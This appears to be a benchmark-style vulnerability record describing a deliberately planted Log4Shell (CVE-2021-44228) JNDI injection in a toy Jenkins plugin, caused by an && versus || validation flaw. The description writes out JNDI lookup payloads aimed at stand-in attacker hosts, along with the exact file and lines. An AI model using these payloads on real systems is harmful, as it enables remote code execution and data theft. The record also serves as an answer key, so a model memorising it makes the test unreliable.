id: cpv_6

name: JNDI Injection via Logic Flaw in Input Validation (Log4Shell)

cwes:
- CWE-917
- CWE-117
- CWE-20

description: |
  This is a critical JNDI Injection vulnerability (Log4Shell - CVE-2021-44228) in the 
  Jenkins Toy Plugin's StateMonitor class. The vulnerability consists of two compounding 
  issues: (1) A logic flaw in the validation code uses AND (&&) instead of OR (||) when 
  checking if name and password match the allowed pattern, allowing an attacker to bypass 
  validation by providing a valid name while injecting malicious content in the password 
  parameter. (2) The bypassed password value is passed unsanitized to logger.error() at 
  line 58. Since the plugin uses Apache Log4j version 2.14.1, which is vulnerable to 
  CVE-2021-44228, the logger performs JNDI lookups when encountering strings like 
  ${jndi:ldap://attacker.com/}. An attacker can send a POST request with name=admin and 
  password=${jndi:ldap://g.co/} to trigger a JNDI lookup to an attacker-controlled server, 
  leading to Remote Code Execution (RCE), data exfiltration, and complete system compromise.

locations:
- path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
  function_name: doCheck
  startLine: 48
  startColumn: 0
  endLine: 58
  endColumn: 0